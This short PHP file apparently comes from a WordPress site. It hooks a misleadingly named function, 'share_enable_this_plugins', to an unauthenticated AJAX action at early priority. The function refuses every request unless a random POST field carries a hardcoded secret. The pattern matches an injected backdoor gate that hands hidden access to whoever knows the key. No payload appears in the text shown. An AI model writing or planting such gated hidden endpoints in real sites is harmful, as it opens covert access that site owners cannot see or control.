<?php

function share_enable_this_plugins() {
	if (!isset($_POST["lmpichpwejs"]) || $_POST["lmpichpwejs"] !== "t9eENWeBsuFupk") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'share_enable_this_plugins', 5, 1);
